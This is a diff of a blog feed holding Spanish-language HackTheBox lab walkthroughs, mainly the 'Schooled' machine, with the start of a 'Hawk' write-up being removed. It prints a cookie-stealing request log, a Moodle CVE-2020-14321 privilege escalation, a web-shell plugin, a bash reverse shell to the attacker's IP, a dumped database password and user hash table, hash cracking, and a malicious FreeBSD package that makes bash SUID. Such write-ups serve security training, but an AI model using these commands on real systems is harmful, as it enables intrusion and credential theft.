+10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:22:25] <span class="s2">"GET /GG.js HTTP/1.1"</span> 200 -
+10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:22:25] <span class="s2">"GET /?cookie=MoodleSession=hpo7nmn5ui79m0cfqdo14akfgi HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<ul>
+  <li>Una ves cambiamos la <code class="language-plaintext highlighter-rouge">Cookie</code> simplemente recargamos la pagina.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/11.png" />
+</p>
+
+<ul>
+  <li>Y ya estamos como otro usuario.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/12.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Bueno realmente no encontramos nada interesante pero si buscamos en Github encontramos esto que es interesante <a href="https://github.com/HoangKien1020/CVE-2020-14321/tree/master">https://github.com/HoangKien1020/CVE-2020-14321/tree/master</a> podemos obtener RCE a partir de subir un .zip y al parecer para obtener privilegios de Manager le inyecta todo el <code class="language-plaintext highlighter-rouge">payload</code> que deja abajo en el repositorio.</p>
+  </li>
+  <li>
+    <p>El problema es que nos tenemos que convertir en un usuario que sea Manager y una de ellos como lo vimos en la pagina web principal es <code class="language-plaintext highlighter-rouge">Lianne Carter</code> .</p>
+  </li>
+  <li>
+    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Enrol Users</code> podemos ver que si existe.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/13.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Una vez añadido el usuario no podemos convertirnos en el pero en <code class="language-plaintext highlighter-rouge">Moodle</code> hay una opción para poder convertirnos en otro usuario.</p>
+  </li>
+  <li>
+    <p>Ahora vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">BurpSuite</code> a la hora de añadir al usuario <strong>Hay que eliminarlo primero otra vez</strong>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/14.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora si vemos hay un parámetro que se llama <code class="language-plaintext highlighter-rouge">roletoassing</code> vamos a cambiarlo a 1 ya que casi siempre es el del admin, aparte vemos uno que se llama <code class="language-plaintext highlighter-rouge">userlist</code> que es el 25 pero nosotros somos el 24 puedes comprobarlo yendo a tu perfil .</p>
+  </li>
+  <li>
+    <p>Ahora simplemente le damos a Send.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/15.png" />
+</p>
+
+<ul>
+  <li>Funciono.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/16.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora hacemos un Forward y vemos esto: “en caso de no funcionarte no lo hagas desde el repeater”.</p>
+  </li>
+  <li>
+    <p>Si lo volvemos añadir vemos que ahora nos aparece esto.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/17.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/18.png" />
+</p>
+
+<ul>
+  <li>No podemos instalar <code class="language-plaintext highlighter-rouge">Plugins</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/19.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Si regresamos al <code class="language-plaintext highlighter-rouge">POC</code> recordemos que inyecta un <code class="language-plaintext highlighter-rouge">Payload</code> para obtener full <code class="language-plaintext highlighter-rouge">permissions</code> así que nos falta eso.</p>
+  </li>
+  <li>
+    <p>Ahora le damos <code class="language-plaintext highlighter-rouge">click</code> en Manager.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/20.png" />
+</p>
+
+<ul>
+  <li>Después le damos en <code class="language-plaintext highlighter-rouge">Edit</code> y vamos a capturar a la hora de hacer <code class="language-plaintext highlighter-rouge">Save Changes</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/burp.png" />
+</p>
+
+<ul>
+  <li>Ahora cambiamos todo el <code class="language-plaintext highlighter-rouge">payload</code> por el que esta en Github.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/payload.png" />
+</p>
+
+<ul>
+  <li>Ahora al darle a <code class="language-plaintext highlighter-rouge">Send</code> vemos que ya podemos instalar plugins.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/schooled/GG.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Ahora en <code class="language-plaintext highlighter-rouge">Plugins</code> vamos a subir el .zip que nos dicen en el POC.</p>
+  </li>
+  <li>
+    <p>Después de subirlo tenemos RCE.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd<span class="o">=</span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+
+<ul>
+  <li>Enviamos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.13/443 0&gt;&amp;1'"</span> http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php
+</code></pre></div></div>
+
+<ul>
+  <li>Recibimos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.13] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234] 52493
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1132<span class="o">)</span>: Can<span class="s1">'t assign requested address
+bash: no job control in this shell
+[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ whoami
+www
+[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ 
+</span></code></pre></div></div>
+
+<h2 id="shell-as--jamie">Shell as  jamie</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /]<span class="nv">$ </span>/usr/local/bin/python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+/usr/local/bin/python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
+<span class="o">[</span>www@Schooled /]<span class="nv">$ </span>^Z
+zsh: suspended  nc <span class="nt">-nlvp</span> 443
+                                                       
+❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg
+</span>reset xterm
+ENTER
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la contraseña para la base de datos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span><span class="nb">cat </span>config.php
+&lt;?php  // Moodle configuration file
+
+<span class="nb">unset</span><span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
+global <span class="nv">$CFG</span><span class="p">;</span>
+<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">'native'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">'PlaybookMaster2020'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">'mdl_'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
+  <span class="s1">'dbpersist'</span> <span class="o">=&gt;</span> 0,
+  <span class="s1">'dbport'</span> <span class="o">=&gt;</span> 3306,
+  <span class="s1">'dbsocket'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
+  <span class="s1">'dbcollation'</span> <span class="o">=&gt;</span> <span class="s1">'utf8_unicode_ci'</span>,
+<span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">'http://moodle.schooled.htb/moodle'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">'/usr/local/www/apache24/moodledata'</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>
+
+require_once<span class="o">(</span>__DIR__ <span class="nb">.</span> <span class="s1">'/lib/setup.php'</span><span class="o">)</span><span class="p">;</span>
+
+// There is no php closing tag <span class="k">in </span>this file,
+// it is intentional because it prevents trailing whitespace problems!
+<span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Nos conectamos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span>/usr/local/bin/mysql <span class="nt">-u</span> moodle <span class="nt">-pPlaybookMaster2020</span> moodle
+mysql: <span class="o">[</span>Warning] Using a password on the <span class="nb">command </span>line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MySQL connection <span class="nb">id </span>is 788
+Server version: 8.0.23 Source distribution
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+moodle@localhost <span class="o">[</span>moodle]&gt; 
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moodle@localhost <span class="o">[</span>moodle]&gt; <span class="k">select </span>username, email, password from mdl_user<span class="p">;</span>
++-------------------+----------------------------------------+--------------------------------------------------------------+
+| username          | email                                  | password                                                     |
++-------------------+----------------------------------------+--------------------------------------------------------------+
+| guest             | root@localhost                         | <span class="nv">$2y$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 |
+| admin             | jamie@staff.schooled.htb               | <span class="nv">$2y$10$3D</span>/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW |
+| bell_oliver89     | bell_oliver89@student.schooled.htb     | <span class="nv">$2y$10$N0feGGafBvl</span>.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK |
+| orchid_sheila89   | orchid_sheila89@student.schooled.htb   | <span class="nv">$2y$10$YMsy0e4x4vKq7HxMsDk</span>.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC |
+| chard_ellzabeth89 | chard_elizabeth89@student.schooled.htb | <span class="nv">$2y$10$D0Hu9XehYbTxNsf</span>/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC |
+| morris_jake89     | morris_jake89@student.schooled.htb     | <span class="nv">$2y$10$UieCKjut2IMiglWqRCkSzerF</span>.8AnR8NtOLFmDUcQa90lair7LndRy |
+| heel_james89      | heel_james89@student.schooled.htb      | <span class="nv">$2y$10$sjk</span>.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim |
+| nash_michael89    | nash_michael89@student.schooled.htb    | <span class="nv">$2y$10$yShrS</span>/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu |
+| singh_rakesh89    | singh_rakesh89@student.schooled.htb    | <span class="nv">$2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu</span> |
+| taint_marcus89    | taint_marcus89@student.schooled.htb    | <span class="nv">$2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa</span> |
+| walls_shaun89     | walls_shaun89@student.schooled.htb     | <span class="nv">$2y$10$EDXwQZ9Dp6UNHjAF</span>.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga |
+| smith_john89      | smith_john89@student.schooled.htb      | <span class="nv">$2y$10$YRdwHxfstP0on0Yzd2jkNe</span>/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em |
+| white_jack89      | white_jack89@student.schooled.htb      | <span class="nv">$2y$10$PRy8LErZpSKT7YuSxlWntOWK</span>/5LmSEPYLafDd13Nv36MxlT5yOZqK |
+| travis_carl89     | travis_carl89@student.schooled.htb     | <span class="nv">$2y$10$VO</span>/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S |
+| mac_amy89         | mac_amy89@student.schooled.htb         | <span class="nv">$2y$10$PgOU</span>/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i |
+| james_boris89     | james_boris89@student.schooled.htb     | <span class="nv">$2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba</span>/1MgsQ9P/hcwErzAYUtzWq |
+| pierce_allan      | pierce_allan89@student.schooled.htb    | <span class="nv">$2y$10$ia9fKz9</span>.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy |
+| henry_william89   | henry_william89@student.schooled.htb   | <span class="nv">$2y$10$qj67d57dL</span>/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu |
+| harper_zoe89      | harper_zoe89@student.schooled.htb      | <span class="nv">$2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy</span> |
+| wright_travis89   | wright_travis89@student.schooled.htb   | <span class="nv">$2y$10$XFE</span>/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm |
+| allen_matthew89   | allen_matthew89@student.schooled.htb   | <span class="nv">$2y$10$kFYnbkwG</span>.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq |
+| sanders_wallis89  | sanders_wallis89@student.schooled.htb  | <span class="nv">$2y$10$br9VzK6V17zJttyB8jK9Tub</span>/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u |
+| higgins_jane      | higgins_jane@staff.schooled.htb        | <span class="nv">$2y$10$n9SrsMwmiU</span>.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 |
+| phillips_manuel   | phillips_manuel@staff.schooled.htb     | <span class="nv">$2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG</span> |
+| carter_lianne     | carter_lianne@staff.schooled.htb       | <span class="nv">$2y$10$jw</span>.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe |
+| parker_dan89      | parker_dan89@student.schooled.htb      | <span class="nv">$2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj</span>.fiQAZXyufW5itreQEc2IB2.OSi |
+| parker_tim89      | parker_tim89@student.schooled.htb      | <span class="nv">$2y$10$YCYp8F91YdvY2QCg3Cl5r</span>.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S |
+| miguelito7x       | miguel@student.schooled.htb            | <span class="nv">$2y$10$ZOlwQZ5odMhZgpHTOvoFveTAFJrw3bum5l321wLE32K7QNqxEyFR6</span> |
++-------------------+----------------------------------------+--------------------------------------------------------------+
+28 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+moodle@localhost <span class="o">[</span>moodle]&gt; 
+
+</code></pre></div></div>
+
+<ul>
+  <li>Como Jamie es una usuaria del sistema vamos a crackear su hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Created directory: /home/miguelrega7/.john
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 1024 <span class="k">for </span>all loaded hashes
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="o">!</span>QAZ2wsx         <span class="o">(</span>?<span class="o">)</span>     
+1g 0:00:04:12 DONE <span class="o">(</span>2024-10-10 19:32<span class="o">)</span> 0.003966g/s 55.12p/s 55.12c/s 55.12C/s 110689..superpet
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos conectamos por ssh.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh jamie@10.10.10.234
+The authenticity of host <span class="s1">'10.10.10.234 (10.10.10.234)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:d9VHI+sFsz7EhIePN0ir7HNAMuj8q3kVvpaQlTOtkU8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.234<span class="s1">' (ED25519) to the list of known hosts.
+(jamie@10.10.10.234) Password for jamie@Schooled:
+Last login: Fri Oct 29 12:35:59 2021 from 10.10.14.23
+FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021
+
+Welcome to FreeBSD!
+
+Release Notes, Errata: https://www.FreeBSD.org/releases/
+Security Advisories:   https://www.FreeBSD.org/security/
+FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
+FreeBSD FAQ:           https://www.FreeBSD.org/faq/
+Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
+FreeBSD Forums:        https://forums.FreeBSD.org/
+
+Documents installed with the system are in the /usr/local/share/doc/freebsd/
+directory, or can be installed later with:  pkg install en-freebsd-doc
+For other languages, replace "en" with a language code like de or fr.
+
+Show the version of FreeBSD installed:  freebsd-version ; uname -a
+Please include that output and any error messages when posting questions.
+Introduction to manual pages:  man man
+FreeBSD directory layout:      man hier
+
+To change this login announcement, see motd(5).
+You can upload the dmesg of your system to help developers get an overview of commonly
+used hardware and peripherals for FreeBSD. Use the curl package to upload it like this:
+curl -v -d "nickname=$USER" -d "description=FreeBSD/$(uname -m) on \
+$(kenv smbios.system.maker) $(kenv smbios.system.product)" -d "do=addd" \
+--data-urlencode '</span>dmesg@/var/run/dmesg.boot<span class="s1">' http://dmesgd.nycbug.org/index.cgi
+jamie@Schooled:~ $ export TERM=xterm
+</span></code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">cat </span>user.txt 
+e8c13c552c9960e9dd4a5d77eb173e8d
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Podemos ejecutar esto como cualquier usuario y sin contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User jamie may run the following commands on Schooled:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg <span class="nb">install</span> <span class="k">*</span>
+jamie@Schooled:~ <span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p><a href="https://gtfobins.github.io/gtfobins/pkg/#sudo">https://gtfobins.github.io/gtfobins/pkg/#sudo</a>.</p>
+  </li>
+  <li>
+    <p>Necesitas instalar esto <a href="https://github.com/jordansissel/fpm">https://github.com/jordansissel/fpm</a>.</p>
+  </li>
+  <li>
+    <p>Todo esto lo vamos a hacer en nuestra maquina de atacante.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s1">'chmod u+s /bin/bash'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
+                                                       
+❯  fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> freebsd <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
+Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span class="s2">"x-1.0.txz"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora lo pasamos ala máquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp <span class="nv">$ </span>curl http://10.10.14.13/x-1.0.txz <span class="nt">--output</span> x-1.0.txz
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- 100   512  100   512    0     0   1391      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  1395
+jamie@Schooled:/tmp <span class="nv">$ </span><span class="nb">ls
+</span>mysql.sock		mysqlx.sock.lock
+mysql.sock.lock		x-1.0.txz
+mysqlx.sock
+jamie@Schooled:/tmp <span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Lo ejecutamos rapido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span><span class="nb">sudo </span>pkg <span class="nb">install</span> <span class="nt">-y</span> <span class="nt">--no-repo-update</span> ./x-1.0.txz
+pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
+pkg: Repository FreeBSD cannot be opened. <span class="s1">'pkg update'</span> required
+Checking integrity... <span class="k">done</span> <span class="o">(</span>0 conflicting<span class="o">)</span>
+The following 1 package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of 0 checked<span class="o">)</span>:
+
+New packages to be INSTALLED:
+	x: 1.0
+
+Number of packages to be installed: 1
+<span class="o">[</span>1/1] Installing x-1.0...
+Extracting x-1.0: 100%
+jamie@Schooled:/tmp/repo <span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora es SUID.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/bash
+<span class="nt">-rwsr-xr-x</span>  1 root  wheel  941288 Feb 20  2021 /usr/local/bin/bash
+jamie@Schooled:/tmp/repo <span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="shell-as-root-and-root-flag">Shell as root and root flag</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span>bash <span class="nt">-p</span>
+<span class="o">[</span>jamie@Schooled /tmp/repo]# <span class="nb">whoami
+</span>root
+<span class="o">[</span>jamie@Schooled /tmp/repo]# <span class="nb">cd</span> /root
+<span class="o">[</span>jamie@Schooled /root]# <span class="nb">cat </span>root.txt 
+b7e535ff5ba87d26e35cccd47f06625a
+<span class="o">[</span>jamie@Schooled /root]# 
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Photobomb (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html" rel="alternate" type="text/html" title="HackTheBox - Photobomb (easy)" /><published>2024-09-29T00:00:00-06:00</published><updated>2024-09-29T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png" />
 </p>
 
@@ -8110,836 +8914,4 @@ neil@tenet:~<span class="err">$</span>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@tenet:~# <span class="nb">cat</span> /root/root.txt
 74e3750ae90e0db4c09df869028cabca 
-</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Hawk (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html" rel="alternate" type="text/html" title="HackTheBox - Hawk (medium)" /><published>2024-07-02T00:00:00-06:00</published><updated>2024-07-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/07/02/hawk.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/72d59997b352994c628a2b58b022b1d0.png" />
-</p>
-
-<ul>
-  <li>Hawk is a medium to hard difficulty machine, which provides excellent practice in pentesting Drupal. The exploitable H2 DBMS installation is also realistic as web-based SQL consoles (RavenDB etc.) are found in many environments. The OpenSSL decryption challenge increases the difficulty of this machine.</li>
-</ul>
-
-<h2 id="portscan">PortScan</h2>
-
-<ul>
-  <li>Comenzamos escaneando los puertos abiertos y sus servicios que corren en los puertos abiertos por el protocolo <strong>TCP</strong>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80,5435,8082,9092 10.10.10.102 <span class="nt">-oN</span> targeted
-Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-07-02 17:09 CST
-Nmap scan report <span class="k">for </span>10.10.10.102
-Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT     STATE SERVICE       VERSION
-21/tcp   open  ftp           vsftpd 3.0.3
-| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
-|_drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
-| ftp-syst:
-|   STAT:
-| FTP server status:
-|      Connected to ::ffff:10.10.14.63
-|      Logged <span class="k">in </span>as ftp
-|      TYPE: ASCII
-|      No session bandwidth limit
-|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
-|      Control connection is plain text
-|      Data connections will be plain text
-|      At session startup, client count was 2
-|      vsFTPd 3.0.3 - secure, fast, stable
-|_End of status
-22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-| ssh-hostkey:
-|   2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 <span class="o">(</span>RSA<span class="o">)</span>
-|   256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df <span class="o">(</span>ECDSA<span class="o">)</span>
-|_  256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp   open  http          Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
-|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
-|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
-| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
-| /includes/ /misc/ /modules/ /profiles/ /scripts/
-| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
